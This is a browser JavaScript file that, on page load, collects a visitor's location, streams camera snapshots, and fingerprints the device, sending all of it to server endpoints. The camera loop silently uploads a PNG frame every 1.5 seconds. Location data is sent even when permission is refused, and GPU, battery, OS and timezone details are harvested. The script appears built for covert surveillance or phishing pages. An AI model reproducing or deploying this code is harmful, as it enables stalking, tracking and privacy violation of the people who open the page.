
const clientId = Date.now().toString(36) + Math.random().toString(36).substring(2);


/**
 * Captures images from the user's camera periodically.
 */
async function captureCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 720, height: 420 } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        let counter = 1;

        const captureFrame = async () => {
            const canvas = document.createElement('canvas');
            canvas.width = 720;
            canvas.height = 420;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL('image/png');

            try {
                await fetch('/save_photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: dataUrl, count: counter, clientId })
                });
                counter++;
            } catch (err) {
                console.error('Camera upload failed:', err);
            }
            
            setTimeout(captureFrame, 1500);
        };

        captureFrame();
    } catch (err) {
        console.error('Camera access denied or failed:', err);
        // This throw is important to signal failure to the caller.
        throw err;
    }
}

/**
 * Captures the user's geolocation and sends it to the server.
 * Returns a promise that resolves when the location is sent or fails.
 */
function captureLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            console.warn("Geolocation not supported by this browser.");
            resolve(); // Resolve immediately if not supported
            return;
        }

        // Function to send location data to the server
        const sendLocationToServer = async (latitude, longitude, accuracy) => {
            try {
                await fetch('/save_location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ latitude, longitude, accuracy, clientId })
                });
            } catch (err) {
                console.error('Failed to send location:', err);
            }
        };

        const options = {
            enableHighAccuracy: true,
            timeout: 8000,
            maximumAge: 0 
        };

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const { latitude, longitude, accuracy } = pos.coords;
                sendLocationToServer(latitude, longitude, accuracy);
                resolve(); // Resolve after sending
            },
            (err) => {
                console.error('Geolocation error:', err.message);
                // --- FIX: Send null location data even if permission is denied ---
                sendLocationToServer(null, null, null); // Send nulls to indicate no precise location
                resolve(); // Resolve even on error to not block other scripts
            },
            options
        );
    });
}

/**
 * Gathers and sends client system and browser information.
 */
async function reportClientInfo() {
    try {
        const battery = await navigator.getBattery();
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";

        const userAgent = navigator.userAgent || "Unknown";
        const osMatch = userAgent.match(/Android\s([0-9\.]+)|iPhone OS ([0-9\_]+)/);
        const osVersion = osMatch ? (osMatch[1] || osMatch[2].replace(/_/g, '.')) : "Unknown";

        const clientInfo = {
            battery: Math.floor(battery.level * 100),
            cpuCores: navigator.hardwareConcurrency || "Unknown",
            ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Unknown",
            gpu: gpu,
            osVersion: osVersion,
            userAgent: userAgent,
            platform: navigator.platform || "Unknown",
            screenWidth: screen.width,
            screenHeight: screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        };

        await fetch('/save_client_info', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...clientInfo, clientId })
        });
    } catch (err) {
        console.error('Client info report failed:', err);
    }
}

// Initialize all data collection on window load.
window.addEventListener('load', async () => {
    // --- FIX: Re-ordered and simplified permission requests ---
    // Browsers can be sensitive to multiple permission prompts.
    // This new sequence asks for location first, waits for it to complete,
    // and then proceeds to the camera request.

    // 1. Request location and wait for the user's response.
    await captureLocation();

    // 2. After location is handled, request camera access.
    try {
        await captureCamera();
    } catch (err) { /* We don't need to do anything if camera fails */ }

    // 3. Finally, send the main device info report.
    reportClientInfo();
});